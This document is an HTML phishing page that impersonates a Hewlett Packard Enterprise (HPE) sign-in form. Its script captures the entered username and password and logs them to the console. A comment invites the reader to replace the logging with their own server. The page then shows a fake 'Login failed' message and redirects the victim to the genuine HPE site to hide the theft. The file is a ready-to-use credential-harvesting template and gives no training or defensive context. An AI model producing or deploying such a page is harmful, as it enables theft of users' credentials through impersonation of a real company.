<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HPE Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f3f4f6;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background: #ffffff;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }
    .logo {
      display: block;
      margin: 0 auto 20px;
      width: 120px;
    }
    h2 {
      text-align: center;
      color: #2e7d32;
      margin-bottom: 30px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0 20px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #2e7d32;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #1b5e20;
    }
    .disclaimer {
      font-size: 12px;
      color: #777;
      text-align: center;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    
    <h2>HPE Login</h2>
    <form onsubmit="captureLogin(event)">
      <input type="text" name="username" placeholder="Email or Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Sign In</button>
    </form>
    <div class="disclaimer">For authorized users only</div>
  </div>

  <script>
    function captureLogin(event) {
      event.preventDefault();
      const username = event.target.username.value;
      const password = event.target.password.value;

      // Simulated exfiltration â€” replace with your server or log to console
      console.log("Captured credentials:", username, password);

      alert("Login failed. Please try again.");
      // Redirect to legit HPE page
      location.href = "https://www.hpe.com/us/en/country-selector.html";
    }
  </script>
</body>
</html>
